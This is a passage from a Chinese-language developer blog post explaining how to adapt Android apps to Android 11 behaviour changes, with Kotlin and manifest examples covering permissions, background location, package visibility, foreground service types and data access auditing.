android.permission.READ_PHONE_STATE, android.permission.READ_SMS, or android.permission.READ_PHONE_NUMBERS</span><br></pre></td></tr></table></figure><p>预想之中哈，<strong>Andmanifest.xml</strong>中注册好权限，并且添加动态权限申请：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_NUMBERS&quot; /&gt;</span><br><span class="line"></span><br><span class="line">ActivityCompat.requestPermissions(this,arrayOf(Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_PHONE_NUMBERS), 100)</span><br></pre></td></tr></table></figure><p>搞定，如果你只需要获取手机号码这一个功能，也可以只申请<strong>READ_PHONE_NUMBERS</strong>这一个权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;  android:maxSdkVersion=&quot;29&quot; /&gt;</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_NUMBERS&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="自定义消息框视图被屏蔽"><a href="#自定义消息框视图被屏蔽" class="headerlink" title="自定义消息框视图被屏蔽"></a>自定义消息框视图被屏蔽</h3><blockquote><p>从 Android 11 开始，已弃用自定义消息框视图。如果您的应用以 Android 11 为目标平台，包含自定义视图的消息框在从后台发布时会被屏蔽</p></blockquote><p>可能有人会奇怪了，什么<strong>是自定义消息框视</strong>图啊？我说英文你就知道了，英文是<strong>custom toast views</strong>，也就是自定义toast。简单写个代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Toast toast = new Toast(context);</span><br><span class="line">toast.setDuration(show_length);</span><br><span class="line">toast.setView(view);</span><br><span class="line">toast.show();</span><br></pre></td></tr></table></figure><p>糟了糟了，自定义toast被弃用了？我们项目就是用的这个啊！不用担心，只是不允许自定义toast从后台显示了。<br>比如我写一个3秒后再显示toast，然后应用一打开就进入后台，看看会发生什么：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Handler().postDelayed(&#123;</span><br><span class="line">      IToast.show(&quot;你好，我是自定义toast&quot;)</span><br><span class="line"> &#125;, 3000)</span><br><span class="line"></span><br><span class="line">W/NotificationService: Blocking custom toast from package com.example.studynote due to package not in the foreground</span><br></pre></td></tr></table></figure><p>啥也没显示，只是发出来一个警告。<br>所以不用太过担心，如果实在需要后台显示，就用普通的toast吧！</p><h3 id="现在需要-APK-签名方案-v2"><a href="#现在需要-APK-签名方案-v2" class="headerlink" title="现在需要 APK 签名方案 v2"></a>现在需要 APK 签名方案 v2</h3><blockquote><p>对于以 Android 11（API 级别 30）为目标平台，且目前仅使用 APK 签名方案 v1 签名的应用，现在还必须使用 APK 签名方案 v2 或更高版本进行签名。用户无法在搭载 Android 11 的设备上安装或更新仅通过 APK 签名方案 v1 签名的应用。</p></blockquote><p>这个介绍已经很明显了吧，如果你<strong>的targetSdkVersion</strong>修改到30，那么你就必须要加上v2签名才行。否则无法安装和更新。</p><h3 id="媒体intent操作需要系统默认相机"><a href="#媒体intent操作需要系统默认相机" class="headerlink" title="媒体intent操作需要系统默认相机"></a>媒体intent操作需要系统默认相机</h3><p>从 Android 11 开始，只有预装的系统相机应用可以响应以下 intent 操作：</p><ul><li>android.media.action.VIDEO_CAPTURE</li><li>android.media.action.IMAGE_CAPTURE</li><li>android.media.action.IMAGE_CAPTURE_SECURE<br>也就是说，如果我调用<strong>intent</strong>唤起照相机，使用<strong>VIDEO_CAPTURE</strong>的action，只有系统的相机能够响应，而第三方的相机应用不会响应了。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">val intent=Intent()</span><br><span class="line">intent.action=android.provider.MediaStore.ACTION_IMAGE_CAPTURE</span><br><span class="line">startActivity(intent)</span><br><span class="line"></span><br><span class="line">//无法唤起第三方相机了，只能唤起系统相机</span><br></pre></td></tr></table></figure>这点对普通的相机应用还是有点打击的，官方给的建议是如果要使用特定的第三方相机应用来代表其捕获图片或视频，可以通过为intent设置软件包名称或组件来使这些intent变得明确。<h3 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h3></li></ul><blockquote><p>Android 11 添加了在您的应用中支持 5G 的功能</p></blockquote><p>新的Android11也是支持了5G相关的一些功能，包括：</p><ul><li>检测是否连接到了5G网络</li><li>检查按流量计费性</li></ul><p>首先是检测5G网络，通过TelephonyManager的监听方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private fun getNetworkType()&#123;</span><br><span class="line">    val tManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager</span><br><span class="line">    tManager.listen(object : PhoneStateListener() &#123;</span><br><span class="line"></span><br><span class="line">        @RequiresApi(Build.VERSION_CODES.R)</span><br><span class="line">        override fun onDisplayInfoChanged(telephonyDisplayInfo: TelephonyDisplayInfo) &#123;</span><br><span class="line">            if (ActivityCompat.checkSelfPermission(this@Android11Test2Activity, android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">            super.onDisplayInfoChanged(telephonyDisplayInfo)</span><br><span class="line"></span><br><span class="line">            when(telephonyDisplayInfo.networkType) &#123;</span><br><span class="line">                TelephonyDisplayInfo.OVERRIDE_NETWORK_TYPE_LTE_ADVANCED_PRO -&gt; showToast(&quot;高级专业版 LTE (5Ge)&quot;)</span><br><span class="line">                TelephonyDisplayInfo.OVERRIDE_NETWORK_TYPE_NR_NSA -&gt; showToast(&quot;NR (5G) - 5G Sub-6 网络&quot;)</span><br><span class="line">                TelephonyDisplayInfo.OVERRIDE_NETWORK_TYPE_NR_NSA_MMWAVE -&gt; showToast(&quot;5G+/5G UW - 5G mmWave 网络&quot;)</span><br><span class="line">                else -&gt; showToast(&quot;other&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;, PhoneStateListener.LISTEN_DISPLAY_INFO_CHANGED)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是5g网络，就免不了要去判断是不是按流量计费的，否则5G的流量可不是开玩笑的。</p><p>检测流量计费方法也很简单，监听网络，在回调中判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">val manager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager</span><br><span class="line"> manager.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() &#123;</span><br><span class="line">    override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) &#123;</span><br><span class="line">      super.onCapabilitiesChanged(network, networkCapabilities)</span><br><span class="line"></span><br><span class="line">        //true 代表连接不按流量计费</span><br><span class="line">        val isNotFlowPay=networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED) ||</span><br><span class="line">                        networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_TEMPORARILY_NOT_METERED)</span><br><span class="line">      &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>判断该值，如果为 true，则将连接视为不按流量计费。</p><h3 id="后台位置信息访问权限"><a href="#后台位置信息访问权限" class="headerlink" title="后台位置信息访问权限"></a>后台位置信息访问权限</h3><blockquote><p>在搭载 Android 11 的设备上，当应用中的某项功能请求在后台访问位置信息时，用户看到的系统对话框不再包含用于启用后台位置信息访问权限的按钮。如需启用后台位置信息访问权限，用户必须在设置页面上针对应用的位置权限设置一律允许选项。</p></blockquote><p>什么意思呢？主要涉及到两点：</p><ul><li>从Android10系统的设备开始，就需要请求后台位置权限<strong>（ACCESS_BACKGROUND_LOCATION）</strong>，并选择<strong>Allow all the time （始终允许）</strong>才能获得后台位置权限。Android11设备上再次加强对后台权限的管理，主要表现在系统对话框上，对话框不再提示始终允许字样，而是提供了位置权限的设置入口，需要在设置页面选择始终允许才能获得后台位置权限。</li><li>在搭载Android11系统的设备上，targetVersion小于30的时候，可以前台后台位置权限一起申请，并且对话框提供了文字说明，表示需要随时获取用户位置信息，进入设置选择<strong>始终允</strong>许即可。但是targetVersion为30的时候，你必须<strong>单独申请</strong>后台位置权限，而且要在获取前台权限之后，顺序不能乱。并且无任何提示，需要开发者自己设计提示样式。</li></ul><p>可能有点绕，操作几个例子说明：</p><ol><li><strong>Android10设备</strong>，申请前台和后台位置权限（任意targetSdkVersion）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestPermissions(arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_BACKGROUND_LOCATION), 100)</span><br></pre></td></tr></table></figure>执行效果：</li></ol><p><img src="/images/20220903/20220903002.jpg"></p><ol start="2"><li><strong>Android11设备</strong>，targetSdkVersion&lt;=29(Android 10),申请前台和后台位置权限：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestPermissions(arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_BACKGROUND_LOCATION), 100)</span><br></pre></td></tr></table></figure>执行效果：</li></ol><p><img src="/images/20220903/20220903003.jpg"></p><ol start="3"><li><strong>Android11设备</strong>，targetSdkVersion=30(Android 11),申请前台和后台位置权限：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestPermissions(arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_BACKGROUND_LOCATION), 100)</span><br></pre></td></tr></table></figure>执行无反应</li><li><strong>Android11设备</strong>，targetSdkVersion=30(Android 11),先申请前台位置权限，后申请后台位置权限：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestPermissions(arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION), 100)</span><br></pre></td></tr></table></figure>执行效果：</li></ol><p><img src="/images/20220903/20220903004.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 100)</span><br></pre></td></tr></table></figure><p>执行效果(直接跳转到设置页面，无任何说明)：</p><p><img src="/images/20220903/20220903005.jpg"></p><p>所以，该怎么适配呢？</p><ul><li><strong>targetSdkVersion&lt;30</strong>情况下，如果你之前就有判断过前台和后台位置权限，那就无需担心，没有什么需要适配。</li><li><strong>targetSdkVersion&gt;30</strong>情况下,需要分开申请前后台位置权限，并且对后台位置权限申请做好说明和引导，当然也是为了更好的服务用户。</li></ul><p>权限申请的demo代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">val permissionAccessCoarseLocationApproved = ActivityCompat</span><br><span class="line">    .checkSelfPermission(this, permission.ACCESS_COARSE_LOCATION) ==</span><br><span class="line">    PackageManager.PERMISSION_GRANTED</span><br><span class="line"></span><br><span class="line">if (permissionAccessCoarseLocationApproved) &#123;</span><br><span class="line">   val backgroundLocationPermissionApproved = ActivityCompat</span><br><span class="line">       .checkSelfPermission(this, permission.ACCESS_BACKGROUND_LOCATION) ==</span><br><span class="line">       PackageManager.PERMISSION_GRANTED</span><br><span class="line"></span><br><span class="line">   if (backgroundLocationPermissionApproved) &#123;</span><br><span class="line">        //前后台位置权限都有</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">        //申请后台权限</span><br><span class="line">        if (applicationInfo.targetSdkVersion &lt; Build.VERSION_CODES.R)&#123;</span><br><span class="line">            ActivityCompat.requestPermissions(this,</span><br><span class="line">                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),</span><br><span class="line">                    200)</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            AlertDialog.Builder(this).setMessage(&quot;需要提供后台位置权限，请在设置页面选择始终允许&quot;)</span><br><span class="line">                    .setPositiveButton(&quot;确定&quot;, DialogInterface.OnClickListener &#123; dialog, which -&gt;</span><br><span class="line">                        ActivityCompat.requestPermissions(this,</span><br><span class="line">                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),</span><br><span class="line">                                200)</span><br><span class="line">                    &#125;).create().show()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (applicationInfo.targetSdkVersion &lt; Build.VERSION_CODES.R)&#123;</span><br><span class="line">        //申请前台和后台位置权限</span><br><span class="line">        ActivityCompat.requestPermissions(this,</span><br><span class="line">                arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_BACKGROUND_LOCATION),</span><br><span class="line">                100)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //申请前台位置权限</span><br><span class="line">        ActivityCompat.requestPermissions(this,</span><br><span class="line">                arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION),</span><br><span class="line">                100)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="软件包可见性"><a href="#软件包可见性" class="headerlink" title="软件包可见性"></a>软件包可见性</h3><blockquote><p>Android 11 更改了应用查询用户已在设备上安装的其他应用以及与之交互的方式。使用新的  元素，应用可以定义一组自身可访问的其他应用。通过告知系统应向您的应用显示哪些其他应用，此元素有助于鼓励最小权限原则。此外，此元素还可帮助 Google Play 等应用商店评估应用为用户提供的隐私权和安全性。</p></blockquote><p>也就是说，<strong>Android11中</strong>，如果你想去获取其他应用的信息，比如包名，名称等等，不能直接获取了，必须在清单文件中添加**<queries>**元素，告知系统你要获取哪些应用信息或者哪一类应用。<br>比如我这段查询应用信息的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">val pm = this.packageManager</span><br><span class="line">val listAppcations: List&lt;ApplicationInfo&gt; = pm</span><br><span class="line">        .getInstalledApplications(PackageManager.GET_META_DATA)</span><br><span class="line">for (app in listAppcations) &#123;</span><br><span class="line">    Log.e(&quot;lz&quot;,app.packageName)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<strong>Android11</strong>版本，只能查询到自己应用和系统应用的信息，查不到其他应用的信息了。怎么呢？添加**<queries>**元素，两种方式：</p><ol><li>元素中加入具体包名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest package=&quot;com.example.game&quot;&gt;</span><br><span class="line">    &lt;queries&gt;</span><br><span class="line">        &lt;package android:name=&quot;com.example.store&quot; /&gt;</span><br><span class="line">        &lt;package android:name=&quot;com.example.services&quot; /&gt;</span><br><span class="line">    &lt;/queries&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure></li><li>元素中加入固定过滤的<strong>intent</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest package=&quot;com.example.game&quot;&gt;</span><br><span class="line">    &lt;queries&gt;</span><br><span class="line">        &lt;intent&gt;</span><br><span class="line">            &lt;action android:name=&quot;android.intent.action.SEND&quot; /&gt;</span><br><span class="line">            &lt;data android:mimeType=&quot;image/jpeg&quot; /&gt;</span><br><span class="line">        &lt;/intent&gt;</span><br><span class="line">    &lt;/queries&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>可能还是有人会疑惑，那我的应用是<strong>浏览器或者设备管理器</strong>咋办呢？我就要获取所有包名啊？<br>放心，Android11还引入了 <strong>QUERY_ALL_PACKAGES</strong> 权限，清单文件中加入即可。但是<strong>Google Play</strong>可不一定能滥用哦，它为需要QUERY_ALL_PACKAGES 权限的应用会提供相关指南，但是还没出来，具体要看后面的消息了。<br>至于国内市场。。。（希望能有个应用市场一统天下好好管理这混乱的市场吧！）<h3 id="文档访问限制"><a href="#文档访问限制" class="headerlink" title="文档访问限制"></a>文档访问限制</h3></li></ol><blockquote><p>为让开发者有时间进行测试，以下与存储访问框架 (SAF) 相关的变更只有在应用以 Android 11 为目标平台时才会生效。</p></blockquote><p>上文存储的时候说过可以通过**SAF(存储访问框架–Storage Access Framework)**来访问公共目录，但是Android11再次升级，部分目录和文件不能访问了，具体如下：<br>无法再使用 <strong>ACTION_OPEN_DOCUMENT_TREE intent</strong> 操作请求访问以下目录：</p><ul><li>内部存储卷的根目录。</li><li>设备制造商认为可靠的各个 SD 卡卷的根目录，无论该卡是模拟卡还是可移除的卡。可靠的卷是指应用在大多数情况下可以成功访问的卷。</li><li>Download 目录。</li></ul><p>无法再使用 <strong>ACTION_OPEN_DOCUMENT_TREE</strong> 或 <strong>ACTION_OPEN_DOCUMENT intent</strong> 操作请求用户从以下目录中选择单独的文件：</p><ul><li>Android/data/ 目录及其所有子目录。</li><li>Android/obb/ 目录及其所有子目录。</li></ul><h3 id="限制对-APN-数据库的读取访问"><a href="#限制对-APN-数据库的读取访问" class="headerlink" title="限制对 APN 数据库的读取访问"></a>限制对 APN 数据库的读取访问</h3><blockquote><p>以 Android 11 为目标平台的应用现在必须具备 Manifest.permission.WRITE_APN_SETTINGS 特权，才能读取或访问电话提供程序 APN 数据库。如果在不具备此权限的情况下尝试访问 APN 数据库，会生成安全异常。</p></blockquote><p>问题来了，APN是啥？</p><ul><li>指一种网络接入技术，是通过手机上网时必须配置的一个参数，APN配置参数包括名字，运营商编号，APN接入点等等。</li></ul><p>就是说如果没有<strong>Manifest.permission.WRITE_APN_SETTINGS</strong>权限就不能读取APN数据库了，但是！这个权限很早之前就被限定只有系统程序才能申请这个权限了，现在这个特权没理解到是什么意思，难道系统程序都不能随便申请了？</p><h3 id="在元数据文件中声明“无障碍”按钮使用情况"><a href="#在元数据文件中声明“无障碍”按钮使用情况" class="headerlink" title="在元数据文件中声明“无障碍”按钮使用情况"></a>在元数据文件中声明“无障碍”按钮使用情况</h3><blockquote><p>从 Android 11 开始，您的无障碍服务无法在运行时声明与系统的“无障碍”按钮的关联。如果您将 AccessibilityServiceInfo.FLAG_REQUEST_ACCESSIBILITY_BUTTON 附加到 AccessibilityServiceInfo 对象的 flags 属性，框架就不会将“无障碍”按钮回调事件传递给您的服务。</p></blockquote><p>做过无障碍辅助功能的应该都知道<strong>AccessibilityServiceInfo</strong>要设置flag为<strong>FLAG_REQUEST_ACCESSIBILITY_BUTTON，getAccessibilityButtonController</strong>方法获取辅助功能按钮控制器，并且可用于查询辅助功能按钮的状态并注册监听器以进行交互和辅助功能按钮的状态更改。</p><p>但是，Android 11开始，这样写不能获取辅助按钮回调事件了，得换成另外一种写法。在元数据文件（通常为 res/raw/accessibilityservice.xml）中使用 <strong>flagRequestAccessibilityButton</strong> 标记声明您的无障碍服务与“无障碍”按钮的关联。</p><h3 id="Firebase-JobDispatcher-和-GCMNetworkManager"><a href="#Firebase-JobDispatcher-和-GCMNetworkManager" class="headerlink" title="Firebase JobDispatcher 和 GCMNetworkManager"></a>Firebase JobDispatcher 和 GCMNetworkManager</h3><blockquote><p>如果您的应用以 API 级别 30 或更高级别为目标平台，在搭载 Android 6.0（API 级别 23）或更高版本的设备上会停用 Firebase JobDispatcher 和 GcmNetworkManager API 调用。</p></blockquote><p>这两个api国内都用不了，主要用于后台任务。官方给出的替代意见是<strong>WorkManager</strong>，这个国内是可以用的，属于jetpack组件，主要用于调度和执行可延期的后台工作。</p><h3 id="设备到设备文件传输"><a href="#设备到设备文件传输" class="headerlink" title="设备到设备文件传输"></a>设备到设备文件传输</h3><blockquote><p>如果您的应用以 Android 11 为目标平台，您将无法再使用 allowBackup 属性停用应用文件的设备到设备迁移。系统会自动启用此功能。不过，即使您的应用以 Android 11 为目标平台，您也可以通过将 allowBackup 属性设置为 false 来停用应用文件的云端备份和恢复。</p></blockquote><p><strong>android:allowBackup属性</strong></p><ul><li>代表是否允许应用参与备份和恢复基础架构。如果将此属性设为 false，则永远不会为该应用执行<strong>备份或恢复</strong>，即使是采用全系统备份方法也不例外（这种备份方法通常会通过 adb 保存所有应用数据）。此属性的默认值为 true。</li></ul><p>所以这里是不能停用文件的<strong>设备到设备</strong>迁移，但是可以停用<strong>云端备份和恢复</strong></p><h3 id="自动重置权限"><a href="#自动重置权限" class="headerlink" title="自动重置权限"></a>自动重置权限</h3><blockquote><p>如果应用以 Android 11 为目标平台并且数月未使用，系统会通过自动重置用户已授予应用的运行时敏感权限来保护用户数据。此操作与用户在系统设置中查看权限并将应用的访问权限级别更改为拒绝的做法效果一样。如果应用已遵循有关在运行时请求权限的最佳做法，那么您不必对应用进行任何更改。这是因为，当用户与应用中的功能互动时，您应该会验证相关功能是否具有所需权限。</p></blockquote><p>官方说明说的很清楚了，而且只要应用遵循有关在运行时请求权限的最佳做法，也就是<strong>每次需要调用权限</strong>的时候都会去判断，那么就不会有什么问题。</p><p>如果需要关闭这个功能怎么办呢？只有引导用户去设置页面关闭了，可以调用包含<strong>Settings.ACTION_APPLICATION_DETAILS_SETTINGS action</strong>的 Intent将用户定向到系统设置中应用的页面。</p><p>怎么检查应用是否停用自动重置功能呢？调用 PackageManager的**isAutoRevokeWhitelisted()**方法。如果此方法返回 true，代表系统不会自动重置应用的权限。</p><h3 id="前台服务类型"><a href="#前台服务类型" class="headerlink" title="前台服务类型"></a>前台服务类型</h3><blockquote><p>从 Android 9 开始，应用仅限于在前台访问摄像头和麦克风。为了进一步保护用户，Android 11 更改了前台服务访问摄像头和麦克风相关数据的方式。如果您的应用以 Android 11 为目标平台并且在某项前台服务中访问这些类型的数据，您需要在该前台服务的声明的 foregroundServiceType 属性中添加新的 camera 和 microphone 类型。</p></blockquote><p>在Android10的时候，对于前台定位服务就必须加上**android:foregroundServiceType=”location”**，现在Android11上又增加了两个权限限制，一个是摄像头一个是麦克风。</p><p>所以总结下来就是，应用某项前台服务需要访问<strong>位置信息、摄像头和麦克风</strong>，那么就要在清单文件中这样添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest&gt;</span><br><span class="line">    &lt;service ...</span><br><span class="line">        android:foregroundServiceType=&quot;location|camera|microphone&quot; /&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><p>有的朋友可能测试发现，不加<strong>foregroundServiceType</strong>的前提下，让<strong>Activity</strong>启动了一个前台服务，并在服务里去获取定位，竟然可以获取到定位信息，难道官方说错了？</p><p>其实这是因为你并没有让前台服务单独运行，你可以试着在Activity启动Service后，进入Home界面，然后过几秒再请求位置，就请求不到了。但是不会崩溃，因为这个被系统设置的权限类别为<strong>MODE_IGNORED</strong>，也就是静默失败模式。</p><p>所以为了保险起见，只要前台服务涉及到了这三个功能，就在清单文件加上<strong>android:foregroundServiceType</strong></p><h3 id="适配Android11手机"><a href="#适配Android11手机" class="headerlink" title="适配Android11手机"></a>适配Android11手机</h3><p>此模块的修改内容针对所有项目<strong>在Android11</strong>手机上存在的改动，与<strong>targetSdkVersion</strong>无关。</p><h3 id="数据访问审核"><a href="#数据访问审核" class="headerlink" title="数据访问审核"></a>数据访问审核</h3><blockquote><p>为了让应用及其依赖项访问用户私密数据的过程更加透明，Android 11 引入了数据访问审核功能。借助此流程得出的见解，您可以更好地识别和纠正可能出现的意外数据访问。</p></blockquote><p>哪些范畴属于用户私密数据呢？其实就是危险权限的调用，所以这个功能就是提供了可以监听危险权限调用的监听。主要涉及到的方法是<strong>AppOpsManager.OnOpNotedCallback</strong>。无论是应用本身，还是依赖库或者SDK中的代码，只要访问到私密数据（危险权限），都会回调给我们。<br>对于工程庞大或者使用较多SDK的工程比较适合用上这个功能，让自己应用的私有数据管理更加透明规范，否则对于私有数据的使用和管理并不全面和方便。而且还可以对权限使用添加归因，也就是一个tag，标志权限用到了什么地方。方便回调的时候知晓哪里使用了私有数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">override fun onCreate(savedInstanceState: Bundle?) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState)</span><br><span class="line">    setContentView(R.layout.activity_test1)</span><br><span class="line"></span><br><span class="line">    //创建归因（attribute）  </span><br><span class="line">    attributionContext = createAttributionContext(&quot;shareLocation&quot;)</span><br><span class="line"></span><br><span class="line">    //监听事件</span><br><span class="line">    val appOpsCallback = object : AppOpsManager.OnOpNotedCallback() &#123;</span><br><span class="line">        private fun logPrivateDataAccess(</span><br><span class="line">                opCode: String, attributionTag: String, trace: String) &#123;</span><br><span class="line">            Log.i(TAG, &quot;Private data accessed. &quot; +</span><br><span class="line">                    &quot;Operation: $opCode\n &quot; +</span><br><span class="line">                    &quot;Attribution Tag:$attributionTag\nStack Trace:\n$trace&quot;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        override fun onNoted(syncNotedAppOp: SyncNotedAppOp) &#123;</span><br><span class="line">            syncNotedAppOp.attributionTag?.let &#123;</span><br><span class="line">                logPrivateDataAccess(syncNotedAppOp.op,</span><br><span class="line">                        it,</span><br><span class="line">                        Throwable().stackTrace.toString())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        override fun onSelfNoted(syncNotedAppOp: SyncNotedAppOp) &#123;</span><br><span class="line">            syncNotedAppOp.attributionTag?.let &#123;</span><br><span class="line">                logPrivateDataAccess(syncNotedAppOp.op,</span><br><span class="line">                        it,</span><br><span class="line">                        Throwable().stackTrace.toString())</span><br><span class="line">            &#125;</span><br><span class="line">        